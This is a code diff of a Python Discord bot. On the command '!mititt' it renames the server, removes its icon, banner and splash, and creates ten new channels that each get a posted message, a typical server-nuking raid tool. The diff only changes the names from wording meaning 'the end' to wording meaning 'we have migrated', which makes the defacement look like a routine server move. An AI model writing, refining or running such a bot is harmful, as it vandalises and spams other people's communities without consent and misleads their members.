@@ -18,7 +18,7 @@ async def on_message(message: discord.Message):
     if message.content == "!mititt":
         try:
             await message.guild.edit(
-                name="終わり",
+                name="移行しました",
                 icon=None,
                 banner=None,
                 splash=None,
@@ -30,7 +30,7 @@ async def on_message(message: discord.Message):
             )
         except:
             await message.guild.edit(
-                name="終",
+                name="移行しました",
                 icon=None,
                 banner=None,
                 splash=None,
@@ -50,7 +50,7 @@ async def on_message(message: discord.Message):
                 pass
 
         for _ in range(10):
-            channel = await message.guild.create_text_channel("終")
+            channel = await message.guild.create_text_channel("移行しました")
             await channel.send(content)
 
 
